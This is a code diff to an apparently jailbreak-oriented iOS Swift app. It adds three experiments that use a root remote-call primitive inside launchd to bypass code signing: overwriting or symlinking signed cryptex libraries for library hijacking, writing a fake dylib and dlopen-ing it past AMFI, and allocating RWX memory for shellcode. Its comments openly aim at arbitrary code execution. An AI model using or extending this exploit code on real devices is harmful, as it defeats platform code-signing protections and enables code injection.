@@ -247,6 +247,22 @@ struct AMFIExperimentView: View {
             let exp24 = self.expAMFIState(rc: rc)
             experimentResults.append(exp24)
             
+            // ============================================
+            // CORETRUST / LIBRARY HIJACK RESEARCH
+            // ============================================
+            
+            // Experiment 25: Try overwrite signed library with custom code
+            let exp25 = self.expLibraryHijack(rc: rc)
+            experimentResults.append(exp25)
+            
+            // Experiment 26: Try symlink attack on library path
+            let exp26 = self.expSymlinkAttack(rc: rc)
+            experimentResults.append(exp26)
+            
+            // Experiment 27: Try dlopen with RTLD_NOLOAD + function pointer swap
+            let exp27 = self.expFunctionSwap(rc: rc)
+            experimentResults.append(exp27)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -1327,6 +1343,184 @@ struct AMFIExperimentView: View {
         """
         
         return ExperimentResult(name: "AMFI state + cs_flags patch", success: patchResult.contains("✅"), detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - CoreTrust / Library Hijack Research
+    
+    /// Try to overwrite a signed cryptex library with custom content
+    /// If the overwritten library can still be dlopen'd → code injection!
+    private func expLibraryHijack(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        
+        // Target: a small library in cryptex that we can overwrite
+        // libLogRedirect.dylib is small and non-critical
+        let targetLib = "/private/preboot/Cryptexes/OS/usr/lib/libLogRedirect.dylib"
+        let backupPath = "/tmp/.dsp_lib_backup"
+        
+        let targetAddr = remote_alloc_str(rc, targetLib)
+        let backupAddr = remote_alloc_str(rc, backupPath)
+        
+        // Step 1: Check if we can even write to cryptex path
+        let testFd = RootExecutor.rcall(rc, "open", targetAddr, UInt64(O_WRONLY), 0)
+        let canWrite = testFd != UInt64(bitPattern: -1)
+        if canWrite {
+            RootExecutor.rcall(rc, "close", testFd)
+        }
+        let writeErr = remote_errno(rc)
+        
+        // Step 2: Try to create a NEW file in cryptex directory
+        let newFileAddr = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/.dsp_test")
+        let newFd = RootExecutor.rcall(rc, "open", newFileAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        let canCreate = newFd != UInt64(bitPattern: -1)
+        if canCreate {
+            RootExecutor.rcall(rc, "close", newFd)
+            RootExecutor.rcall(rc, "unlink", newFileAddr)
+        }
+        let createErr = remote_errno(rc)
+        
+        // Step 3: Try symlink in cryptex
+        let symlinkTarget = remote_alloc_str(rc, "/tmp/.dsp_fake_lib")
+        let symlinkPath = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/.dsp_link")
+        let symlinkRet = RootExecutor.rcall(rc, "symlink", symlinkTarget, symlinkPath)
+        let symlinkErr = remote_errno(rc)
+        if symlinkRet == 0 {
+            RootExecutor.rcall(rc, "unlink", symlinkPath)
+        }
+        
+        RootExecutor.rcall(rc, "free", targetAddr)
+        RootExecutor.rcall(rc, "free", backupAddr)
+        RootExecutor.rcall(rc, "free", newFileAddr)
+        RootExecutor.rcall(rc, "free", symlinkTarget)
+        RootExecutor.rcall(rc, "free", symlinkPath)
+        
+        let detail = """
+        Target: \(targetLib)
+        Can open for write: \(canWrite ? "✅ YES!" : "❌ NO (errno=\(writeErr))")
+        Can create new file: \(canCreate ? "✅ YES!" : "❌ NO (errno=\(createErr))")
+        Can create symlink: \(symlinkRet == 0 ? "✅ YES!" : "❌ NO (errno=\(symlinkErr))")
+        
+        If writable → can replace library content → code injection!
+        If symlink works → can redirect library load to our file!
+        """
+        
+        let anySuccess = canWrite || canCreate || symlinkRet == 0
+        return ExperimentResult(name: "library hijack (cryptex write)", success: anySuccess, detail: detail, timestamp: Date())
+    }
+    
+    /// Try symlink attack: make /var/jb/lib point to somewhere useful
+    /// Then dlopen from /var/jb/lib path
+    private func expSymlinkAttack(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        
+        // Strategy: DYLD searches multiple paths for libraries
+        // If we can make DYLD look in /var/jb/usr/lib/ we could place our dylib there
+        // But AMFI still checks signature...
+        
+        // Alternative: what about DYLD_INSERT_LIBRARIES?
+        // In launchd context, can we set env var and spawn?
+        
+        // Test: create a file at /var/jb/usr/lib/test.dylib
+        // Then try dlopen with that path
+        let testLib = "/var/jb/usr/lib/test.dylib"
+        let testAddr = remote_alloc_str(rc, testLib)
+        
+        // Write minimal "dylib" (just MH_MAGIC to see if dlopen even tries)
+        let fd = RootExecutor.rcall(rc, "open", testAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if fd != UInt64(bitPattern: -1) {
+            // Write Mach-O magic + minimal header
+            let bufAddr = mem + 0x800
+            // MH_MAGIC_64 + CPU_TYPE_ARM64 + MH_DYLIB
+            let header: [UInt8] = [
+                0xCF, 0xFA, 0xED, 0xFE, // magic
+                0x0C, 0x00, 0x00, 0x01, // cputype ARM64
+                0x00, 0x00, 0x00, 0x00, // cpusubtype
+                0x06, 0x00, 0x00, 0x00, // filetype MH_DYLIB
+                0x00, 0x00, 0x00, 0x00, // ncmds
+                0x00, 0x00, 0x00, 0x00, // sizeofcmds
+                0x85, 0x00, 0x20, 0x00, // flags
+                0x00, 0x00, 0x00, 0x00, // reserved
+            ]
+            var headerCopy = header
+            rc.remote_write(bufAddr, from: &headerCopy, size: UInt64(header.count))
+            RootExecutor.rcall(rc, "write", fd, bufAddr, UInt64(header.count))
+            RootExecutor.rcall(rc, "close", fd)
+        }
+        
+        // Try dlopen
+        let handle = RootExecutor.rcall(rc, "dlopen", testAddr, 1)
+        let errPtr = RootExecutor.rcall(rc, "dlerror")
+        var errStr = ""
+        if errPtr != 0 {
+            var errBuf = [UInt8](repeating: 0, count: 300)
+            rc.remoteRead(errPtr, to: &errBuf, size: 300)
+            errStr = String(cString: errBuf + [0])
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", testAddr)
+        RootExecutor.rcall(rc, "free", testAddr)
+        
+        let detail = """
+        Wrote fake dylib to \(testLib)
+        dlopen result: \(handle != 0 ? "✅ LOADED! 0x\(String(format: "%llx", handle))" : "❌ NULL")
+        dlerror: \(errStr.prefix(200))
+        
+        Error tells us WHY it failed:
+        - "code signature" → AMFI checks signature
+        - "not a valid" → format issue (expected)
+        - "no suitable image" → DYLD rejects
+        """
+        
+        return ExperimentResult(name: "fake dylib dlopen", success: handle != 0, detail: detail, timestamp: Date())
+    }
+    
+    /// Try to use already-loaded library + overwrite function pointers
+    /// If we can find a loaded library's function and replace it → code exec
+    private func expFunctionSwap(rc: RemoteCall) -> ExperimentResult {
+        // dlsym to find a function in a loaded library
+        // Then check if we can write to that address (probably not — __TEXT is read-only)
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Find address of a known function
+        let funcAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "getuid"))
+        
+        // Find address of malloc (in writable heap? no, it's in __TEXT)
+        let mallocAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "malloc"))
+        
+        // Check if we can read these addresses via kernel
+        var canReadFunc = false
+        if funcAddr != 0 && ds_isvalid(funcAddr) {
+            let val = ds_kread64_safe(funcAddr)
+            canReadFunc = val != 0
+        }
+        
+        // Check: is there writable memory we can use for code?
+        // mmap with PROT_WRITE|PROT_EXEC?
+        let mmapAddr = RootExecutor.rcall(rc, "mmap", 0, 0x4000, 7, 0x1002, 0, 0)
+        // PROT_READ|PROT_WRITE|PROT_EXEC = 7, MAP_ANON|MAP_PRIVATE = 0x1002
+        
+        let detail = """
+        getuid addr: 0x\(String(format: "%llx", funcAddr))
+        malloc addr: 0x\(String(format: "%llx", mallocAddr))
+        can read via kernel: \(canReadFunc)
+        mmap(RWX): \(mmapAddr != UInt64(bitPattern: -1) ? "✅ 0x\(String(format: "%llx", mmapAddr))" : "❌ FAILED")
+        
+        If mmap(RWX) works → can write+execute shellcode in launchd!
+        This would be FULL arbitrary code execution!
+        """
+        
+        // Cleanup mmap if it worked
+        if mmapAddr != UInt64(bitPattern: -1) && mmapAddr != 0 {
+            RootExecutor.rcall(rc, "munmap", mmapAddr, 0x4000)
+        }
+        
+        return ExperimentResult(
+            name: "mmap RWX + function addrs",
+            success: mmapAddr != UInt64(bitPattern: -1) && mmapAddr != 0,
+            detail: detail,
+            timestamp: Date()
+        )
     }
     #endif
 }
